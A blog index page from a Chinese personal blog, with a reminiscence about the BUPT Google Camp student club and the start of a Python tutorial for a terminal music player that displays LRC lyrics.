<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/5/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    
      
      

      
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/10/11/gcjust-for-fun/" itemprop="url">
                  追忆GC：Just For Fun
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-10-11T00:00:00+08:00" content="2014-10-11">
              2014-10-11
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/10/11/gcjust-for-fun/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/10/11/gcjust-for-fun/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>The time you enjoy wasting is not wasted time. –<a href="http://zh.wikipedia.org/zh/%E4%BC%AF%E7%89%B9%E5%85%B0%C2%B7%E7%BD%97%E7%B4%A0" target="_blank" rel="external">Bertrand Russell</a></p>
</blockquote>
<h2 id="北邮有个叫GC的邪恶组织！">北邮有个叫GC的邪恶组织！</h2><p>先说下什么叫GC。</p>
<blockquote>
<p>北邮Google Camp是Google精神在校园里的延伸，是Google与高校学生之间重要的沟通渠道；由Google资助，由学生自己组织和管理的团体；为传达Google的精神和价值观，而组织有创意的、有启发性的、有趣的活动的团体；并非单纯的技术俱乐部，活动内容针对校园生活的方方面面。我们希望通过共同努力，以实现：让信息触手可及，使之方便并服务于同学；让校园生活能够更加富有创造力与丰富多彩。 </p>
</blockquote>
<p>这是11年招新时的官方介绍，在北邮人论坛上找到的。从06年开始，李开复来北邮演讲，创立了北邮的Google Camp</p>
<p>我并不知道北邮还有这么一个社团，直到chon申请成为论坛linux版主后，被我们怂恿着搞了次版聚。那次版聚第一次见到austin。</p>
<p>当时似乎还去了不少人，正好赶上中秋放假，食堂要关门就把一大群汉子轰出来了，最后版聚就变成了一大群人在食堂前的树荫下站着聊minecraft……最后说到想成立LUG[^1]<br>，aus轻描淡写地说可以借用Google社团的名义招新，借用社团活动地点。众人说好啊好啊，去找Google那个社团协调去啊。aus又轻描淡写地说他就是那个社团的会长。最后又不无悲凉地说现在就他一个人，干脆披着google camp的名义做LUG算了……</p>
<p>我第一次听说了Google Camp。</p>
<p>然后，就没有然后了。</p>
<h2 id="招新">招新</h2><blockquote>
<p>この世に偶然はない　あるのは必然だけ</p>
</blockquote>
<p>这真是个偶然事件。版聚后不久的某天，在北邮游泳馆门前，碰到风尘仆仆的aus。他正赶着去东门取快递，兴致勃勃地给我比划新买的某种特殊形状的移动电源插座还是什么。顺便说，过几天学校各个社团在小松林招新，你帮我招新去吧。我说好啊……</p>
<p>北邮大学社团招新在某个工作日的中午，一大堆各式各样的社团被学校安排到主干道前指定的一小片区域，挂起横幅，发起传单，喊起喇叭。各种大学社团各尽所能，喊口号的唱歌的弹吉他的放视频的摇旗的无所不有，主干道上人山人海，红旗招展，热闹异常。一种青春的青葱记忆扑面而来。</p>
<p>花了好久才找到google camp的小桌子，桌子上挂得还是别的社团的横幅……aus踩着个轮滑，举着他自己画的google camp纸板在湍急的人流中自在地穿梭。</p>
<p>aus招新的态度很是高冷：爱来不来，不来拉倒。想来的自然会来，我们不是什么人都要的。之前有次在论坛上的宣传，这货竟然搞了份基于google docs的相当难度考卷作为招新表……</p>
<p>结果桌上的一沓子传单都给我打草稿去了。顺便说下aus主导下的google camp招新也够高端的，微信刷传单二维码报名……</p>
<p>陆陆续续有人看到就来问，你们这个社团都有些啥活动啊？有没有推荐去谷歌实习啊？对将来去谷歌有没有帮助啊？</p>
<p>aus的态度倒是明确，就是一群人在一起玩，折腾技术，搞各种有意思的东西。Just for fun。</p>
<p>总之，最后有几个人报名了。</p>
<h2 id="新成员见面会">新成员见面会</h2><p>白天和aus、chenlin、lcl一起去刷了第一个活动，由北京GDG[^2]组织，每年一度的Devfest[^5]。</p>
<p>活动在复习门中国职工之家。先说活动内容，由于个人时间缘故我只听了上午场，一个关于安卓中的设计原则，另一个展示了些网络开放技术。基本算是通俗易懂老少咸宜，下午会场分为两个，技术性就比较强了，不过现在看看都是相当新颖和激动人心的技术介绍。</p>
<p>再说说其它福利，一件谷歌开发者的T-shirt，一个badge，一个安卓小机器人，丰盛到让人瞠目结舌的茶点和午餐。多丰盛？各种水果、点心、饮品的不限量供应和几十样菜品自助午餐。</p>
<p><img src="/images/devfest.jpeg" alt="更好的照片找不到了，剩下一大堆吃不下了"></p>
<p>晚上是google camp的第一次见面会。好吧，我当时只是说帮aus招新并不打算自己去参加什么大学社团。但是，aus说帮我要到了一个安卓小机器人。那么……第一次见面会我也去了……</p>
<p>在教三的一个小教室，aus坐在讲台上，拿着数位板在幻灯机上画着扯着。台下总共不超过七个人，还有一个在自习。aus说，还不错嘛，就这些人了，就是觉得团队应该小，去年招新坐满了大半个大教室，都是打酱油的。这样我们玩起来也方便，我们这个社团是什么社团了，一个字，玩……</p>
<p>我已经记不得具体扯了什么，大概就是说，Just for fun吧。</p>
<p>aus不断扯着，在数位板上画着。几个人玩了一个binggo游戏，aus拿来了一些gc一堆纪念品比如杯子啥的和白天devfest要来的安卓小机器人做奖品。又玩了一个互相帮助互相记住姓名的小游戏。一晚上也算过得轻松愉快，和印象中的新成员见面会不太一样，新奇的感觉扑面而来。</p>
<p>那次开始我就非常佩服aus，非常有热情和想法的一个人。</p>
<p>aus说，我们这个社团，就是一起玩嘛，大家以后想晚点啥，我们蹭轮滑社活动去吧，我们要么合宿去吧，blablabla……</p>
<p>现在回头想想，虽然似乎很多理想后来都没实现，gc也算是我最理想的社团类型了。松散而自由的同好会，为服务人而不是组织而存在，这是我在骑迹时对兴趣类社团的理想形态。</p>
<p>aus也算做到了他所说的。</p>
<p>Just for fun</p>
<h2 id="游园会">游园会</h2><p>从来没有例会……也许我不算是正式成员，可有天aus忽然问我学院专业和学号，说是要加德育分。我要德育分有毛用……</p>
<p>合宿和蹭轮滑社活动的事情好像也没发生，也许是因为我不是正式会员也许是作为北邮的研究生时刻在老板强制搬砖的巨大阴影里无暇顾它。</p>
<p>印象比较深刻的有次游园会。</p>
<p>游园会是学校社联主办的活动，让各个社团在图书馆前的时光广场台上做一次展示，提供给各个社团一个摊位来展示自己。同时提供丰厚的礼品鼓励在校生逛遍各个摊位。</p>
<p>作为可怜的小社团，分好的摊位又被人占了……于是，经过和学校保安反复斡旋，我们非法侵占道路尽头横卧中央君临天下独一无二的位置。</p>
<p>我再次佩服起aus的创造力和热情。他花了不知道多久自己做了一个用来玩翻板连连看的翻版装置，一大堆各色七巧板，制作了一堆画着各种七巧板拼成图形的纸条。自己买了一堆橡皮泥和一大堆吃的作为奖品。打印了一大堆贴纸，安排了一个黑360的演出……</p>
<p>凡是想来盖章的同学都被aus要求选择一个游戏来玩，aus安排人负责游戏说明、过程监督、发放奖品，本来似乎没什么意思的游戏似乎同学们都玩得挺high，这倒是出乎我的意料，以致于最后自己也特别high。就这么手忙脚乱我们搞到下午快两点才吃饭。</p>
<p>临走时顺了aus一罐橡皮泥玩，哈哈，下图是用橡皮泥捏的安卓小机器人和devfest上aus带给我的小机器人。</p>
<p><img src="/images/android.jpeg" alt="橡皮泥小人"></p>
<p>aus让我相信乐趣可以依靠简简单单的事情和热情实现。</p>
<h2 id="轻松学安卓">轻松学安卓</h2><p>我们还蹭过几个北京GDG组织的活动。其中一个就是大猫组织的：<a href="http://zhuanlan.zhihu.com/anzhuo" target="_blank" rel="external">轻松学安卓系列</a>。</p>
<p>第一课是在车库咖啡。GC一群人，还加上一个网研的师兄LQ和我一个室友，去得有些晚，结果一进去完全被车库咖啡的盛况给震惊了，连位置都找不到了，最后我和LQ在后面随便找了个地方坐下，然后LQ被一个想创业的大妈问个不停，LQ机智的说，其实我们是北航的～。aus则带着gc的妹子汉子们搬着小板凳挤到靠前的位置真的认真学安卓去了。</p>
<p>黎敏对活动最后挺不满，还写了篇<a href="http://zhuanlan.zhihu.com/anzhuo/19628138" target="_blank" rel="external">避免灾难重现——活动总结和分享</a>的文章。从某种程度上，活动人数超出预期，音响和屏幕效果未达到预期，宣传和最后的效果差距较大。反正我最后hello world没写出来……</p>
<p>但，并不是全无收获。见到了shadowsocks的作者知乎工程师clowindy，抢答环节意外被扔给了件eoe<a href="[移动开发者社区](http://www.eoeandroid.com/)">^3</a>的T-shirt做奖品……第一次看到java代码……</p>
<p>LQ倒很牛逼，自己坐在后头也不听了，在mac上按着google给的文档自己把helloworld写了出来，还给我展示了一遍。于是回去我也实现了helloworld……</p>
<p>至于其他同去的汉子与妹子们……他们略纠结……</p>
<p>有意思吗？然而aus想得倒挺好，一起学安卓，然后做很好玩的东西！</p>
<p>大猫吸取了上次教训，第二课限制了人数，地点放在了友盟公司。大猫依然热情依旧，课上问这问那的，践行着happy coding的理念。我想说的是，gc的活动并不是没有机会接触妹子的，当时做我旁边的就是一个首都师范的萌妹子，对于学习新知识也真是热情高涨，aus、侠侠、我三个人做一排，就这么三个什么也不懂的非常high的互相帮助。最后，我竟然跑出来先得了一个安卓小机器人……侠侠在结课前也运行成功，她特别兴奋的样子，aus倒有些悲剧，系统引导就折腾半天，不过他倒不介意，玩得开心就好。</p>
<p>第三课，就我一个去了……地点在eoe，当时去晚了进不去就回去了。回去时在路过圣熙八号时大猫知道了，大猫说，一起来玩吧，没讲多少！我于是又回去蹭了一堆好吃好喝的……</p>
<p>虽然今后再也没玩过安卓，但回忆当时在这些活动中学安卓，真是轻松愉快啊。</p>
<p>顺便一说，aus当时还在学校举办了个安卓讲座。为了防止人太多进行了极度低调的宣传。结果……总共除了自习的就gc里两个妹子、aus、chon、我去了。还有一个社联来旁听的妹子……aus显然高估了学校里同学们对技术和折腾有意思事情的热情。</p>
<p>既然如此，整个计划就变成chon一个人跟我们分享他做“贵邮”客户端的一些关乎设计、方法、技术的经验了。虽然我真心觉得chon讲的非常实在、展示非常简洁漂亮。对真的想做安卓的同学来说，错过chon的这次分享挺可惜的，最后这个分享也没公开分享。可是台下旁听的社联妹子弱弱问了句旁边的妹子，学这个有什么用吗？</p>
<p>Just for fun吧，我想，技术的意义对有些人是赚钱谋生，有些人是想做有意思的事情，有些人则想着改变世界[^4]。</p>
<p>最后的最后，作为对GDG的支持，aus在学安卓那个群里曾经邀请gdg活动来北邮。后来<a href="http://zhuanlan.zhihu.com/anzhuo/19692747" target="_blank" rel="external">全栈型工程师</a>活动分享就在北邮教三进行，可惜我错过了。</p>
<h2 id="DevArt">DevArt</h2><p>首先解释下<a href="https://devart.withgoogle.com/" target="_blank" rel="external">DevArt</a>，大概就是google主办的把艺术和编程结合的一个全球比赛活动。</p>
<p>有天aus忽然喊我们去蹭午餐和茶点。</p>
<p>GC一群人怀着满怀的希望和热情一大早奔向谷歌中国，结果发现只是谷歌市场部和中央美院发起的“只差一个程序员”活动……去了真真就只有我们和中央美院几个缺少程序员的参赛团队。于是几个团队讲了讲他们的想法，我们说了说我们的建议。aus真是能扯啊，而且扯起来一气呵成，听起来还像模像样。然后，主办方要求我们组队……我们混了瓶饮料，玩了会桌上足球，找了个借口，在他们要给我们买午饭之前拒绝撤离了……</p>
<p>听上去完全没意思？</p>
<p>LQ带了个谷歌眼镜。我第一次见到谷歌眼镜，GC几个人拿着可是玩了好一阵，可惜我视力不好，怎么调都看不太清。但是眨眼拍照，语音控制和敲眼镜旁边金属的动作还是留下了挺深刻的印象。照片非常有意思，第一视角还挺清晰。谷歌市场部那位阿姨显然也没见过，玩起来简直忘了她想要我们干什么了……</p>
<p>一路上和chon扯淡，说到palm什么什么的，和aus扯淡，aus跟我们展示ingress的玩法什么的，回来一起在新食堂吃香锅什么什么的。</p>
<p>你所享受的时间不是被浪费的时间。</p>
<h2 id="参观谷歌中国">参观谷歌中国</h2><p>依然是GC自由随性的风格，aus在微信里随便一喊，时间随便一定，确定后就去了。</p>
<p>在路上众人又是一路瞎扯，aus对技术和折腾有意思的事还是满怀热情，不停给我讲着他最近又做了什么什么特别好玩～</p>
<p>两个师姐接待了我们，带着我们逛了逛公司内置的游戏室、健身房、咖啡厅、帐篷室……<br>整个区域环境和采光都不错。品尝了苦涩的咖啡和冰柜里码满的饮料，还有好多饼干零食没来得及吃……</p>
<p>去办公区，一片柔和的米黄色灯光，里头看上去空空荡荡的。正好LQ在那里实习最后一天，一群人路过时站那里围观他的工位= =，于是他跟我们一起去旁边一个小会议室。</p>
<p>然后就进入了和谷歌工程师交流环节，一群人聊了聊谷歌在中国的情况、google camp的现状和将来、谷歌实习和正式的申请、弹性工作和待遇、发展前景等等。真难为两个学妹，没聊一会就跑外面玩桌上足球玩得特high……我们还以为她们被锁在外头了……</p>
<p>结果就是，想将来在谷歌上班了……</p>
<h2 id="结语">结语</h2><p>还有些其它活动吧，比如I/O之夜什么的。大概我就不知道了，时光洪流滚滚，每天在科研楼朝作夕归，世界蜷缩在实验室周围，都不知道自己做了什么。</p>
<p>昨天在谷歌交流时，说到北京就三所学校有google camp，如今也只有北邮的还活着。谷歌市场部没有继续推广的打算，但也不主动取消。众人提议干脆就像当初说的，和LUG一起算了。当时我想，让它自然地来吧，让它悄然地去吧。</p>
<p>但回忆Google Camp这一年，我觉得aus做到了他所说的，所设想的。挺不容易的，本以为他就会放任不管让社团自生自灭的。</p>
<p>无论如何，这是aus，是GC给我的启示:</p>
<p>没有必要这么功利，热情和乐趣更重要。</p>
<p>Just for fun.</p>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: Linux User Group，Linux用户组。<br>[^2]: Google Developer Group，谷歌开发者小组</p>
<p>[^4]: 我是指<a href="http://en.wikipedia.org/wiki/Aaron_Swartz" target="_blank" rel="external">Aaron Swartz</a><br>[^5]: <a href="http://devfest.gdgbeijing.org/2013/" target="_blank" rel="external">2013 北京 DevFest</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2014/10/09/lrc/" itemprop="url">
                  支持LRC歌词的终端播放器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-10-09T00:00:00+08:00" content="2014-10-09">
              2014-10-09
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2014/10/09/lrc/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2014/10/09/lrc/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>最终效果可以看这里：</p>
<p><a href="http://ascii.io/a/12843" target="_blank" rel="external">来自asciinema的终端录像</a></p>
<h2 id="缘起">缘起</h2><p>自从降频之后，电脑特别卡……</p>
<p>降频是因为总是自动关机</p>
<p>自动关机据几个月观察是因为cpu过热</p>
<p>cpu过热猜测是因为散热有问题了</p>
<p>散热有问题猜测是该清灰换硅胶了</p>
<p>但三星……非常麻烦，自从去年毕业自己把本拆了一遍后就再懒得拆机了。</p>
<p>于是，想听歌时懒得打开vlc界面，就用命令行版本的cvlc来播放</p>
<p>可是……没有歌词？</p>
<p>某天想干脆自己做个支持lrc的终端播放器算了。</p>
<p>作为一个脚本小子，我只习惯python……</p>
<h2 id="说干就干">说干就干</h2><p>谷歌搜寻了下：</p>
<ul>
<li>python如何播放mp3音乐</li>
<li>lrc文件的格式，考虑下如何在终端打印歌词</li>
<li>vlc有没有python绑定</li>
</ul>
<p>于是，有了以下版本，仅仅100行的多彩歌词显示终端播放器(使用<code>pygame</code>来播放音乐)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> mixer</span><br><span class="line"><span class="keyword">from</span> mutagen.mp3 <span class="keyword">import</span> MP3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f_mp3 = sys.argv[<span class="number">1</span>]</span><br><span class="line">f_lrc = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lrc2dict</span><span class="params">(lrc)</span>:</span></span><br><span class="line">    lrc_dict = &#123;&#125;</span><br><span class="line">    remove = <span class="keyword">lambda</span> x: x.strip(<span class="string">'[|]'</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lrc.split(<span class="string">'\n'</span>):</span><br><span class="line">        time_stamps = re.findall(<span class="string">r'\[[^\]]+\]'</span>, line)</span><br><span class="line">        <span class="keyword">if</span> time_stamps:</span><br><span class="line">            <span class="comment"># 截取歌词</span></span><br><span class="line">            lyric = line</span><br><span class="line">            <span class="keyword">for</span> tplus <span class="keyword">in</span> time_stamps:</span><br><span class="line">                lyric = lyric.replace(tplus, <span class="string">''</span>)</span><br><span class="line">            <span class="comment"># 解析时间</span></span><br><span class="line">            <span class="comment"># tplus: [02:31.79]</span></span><br><span class="line">            <span class="comment"># t 02:31.79</span></span><br><span class="line">            <span class="keyword">for</span> tplus <span class="keyword">in</span> time_stamps:</span><br><span class="line">                t = remove(tplus)</span><br><span class="line">                tag_flag = t.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="comment"># 跳过: [ar: 逃跑计划]</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> tag_flag.isdigit():</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                time_lrc = int(tag_flag) * <span class="number">60000</span></span><br><span class="line">                time_lrc += int(t.split(<span class="string">':'</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">                <span class="comment"># ms也许没有</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    time_lrc += int(t.split(<span class="string">'.'</span>)[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="comment"># 截取到0.1s精度,降低cpu占用</span></span><br><span class="line">                time_lrc = time_lrc / <span class="number">100</span> * <span class="number">100</span></span><br><span class="line">                lrc_dict[time_lrc] = lyric</span><br><span class="line">    <span class="keyword">return</span> lrc_dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_lrc</span><span class="params">(mixer, lrc_d, color, wholetime)</span>:</span></span><br><span class="line">    mixer.music.play()</span><br><span class="line">    <span class="comment"># 防止开头歌词来不及播放</span></span><br><span class="line">    mixer.music.pause()</span><br><span class="line">    time.sleep(<span class="number">0.001</span>)</span><br><span class="line">    mixer.music.play()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 截取到0.1s精度,降低cpu占用</span></span><br><span class="line">        t = mixer.music.get_pos() / <span class="number">100</span> * <span class="number">100</span></span><br><span class="line">        sys.stdout.write(<span class="string">'['</span> +</span><br><span class="line">                         time.strftime(<span class="string">"%M:%S"</span>, time.localtime(t / <span class="number">1000</span>)) +</span><br><span class="line">                         <span class="string">'/'</span> +</span><br><span class="line">                         time.strftime(<span class="string">"%M:%S"</span>,</span><br><span class="line">                                       time.localtime(wholetime)) +</span><br><span class="line">                         <span class="string">'] '</span>)</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> lrc_d:</span><br><span class="line">            sys.stdout.write(color + lrc_d[t] + <span class="string">'\033[0m'</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="comment"># 向后清除</span></span><br><span class="line">            sys.stdout.write(<span class="string">"\033[K"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="comment"># 向后清除</span></span><br><span class="line">            <span class="comment"># sys.stdout.write("\033[K")</span></span><br><span class="line">        sys.stdout.write(<span class="string">'\r'</span>)</span><br><span class="line">        <span class="comment"># 播放停止时退出</span></span><br><span class="line">        <span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 0.05s循环</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(f_lrc) <span class="keyword">as</span> f:</span><br><span class="line">    lrc = f.read()</span><br><span class="line"></span><br><span class="line">lrc_d = lrc2dict(lrc)</span><br><span class="line"></span><br><span class="line">mixer.init()</span><br><span class="line">mixer.music.load(f_mp3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    wholetime = MP3(f_mp3).info.length</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    wholetime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">colors = [</span><br><span class="line">    <span class="string">'\x1B[31m'</span>,  <span class="comment"># 红色</span></span><br><span class="line">    <span class="string">'\x1B[32m'</span>,  <span class="comment"># 绿色</span></span><br><span class="line">    <span class="string">'\x1B[33m'</span>,  <span class="comment"># 黄色</span></span><br><span class="line">    <span class="string">'\x1B[34m'</span>,  <span class="comment"># 蓝色</span></span><br><span class="line">    <span class="string">'\x1B[35m'</span>,  <span class="comment"># 紫色</span></span><br><span class="line">    <span class="string">'\x1B[36m'</span>,  <span class="comment"># 青色</span></span><br><span class="line">    <span class="string">'\x1B[37m'</span>  <span class="comment"># 灰白</span></span><br><span class="line">]</span><br><span class="line">color = random.choice(colors)</span><br><span class="line">print_lrc(mixer, lrc_d, color, wholetime)</span><br></pre></td></tr></table></figure>
<p>那个不断循环查看播放进度打印对应歌词的实现真够丧心病狂的……精确到0.1s算了。</p>
<pre><code>Be aware that MP3 support is limited. <span class="keyword">On</span> some systems <span class="keyword">an</span> unsupported <span class="keyword">format</span> can crash the <span class="keyword">program</span>, <span class="keyword">e</span>.<span class="keyword">g</span>. Debian Linux. Consider using OGG instead.
</code></pre><p>开始在pygame的<a href="http://www.pygame.org/docs/ref/music.html" target="_blank" rel="external">文档</a>中看到这句话还没在意后来，播放某个叫<code>in my life</code>的mp3时发现完全不对劲……而且没有获取音频长度的功能[^1]</p>
<p>后来想想，还是用vlc的py绑定吧。</p>
<p>vlc的py绑定相当赞：</p>
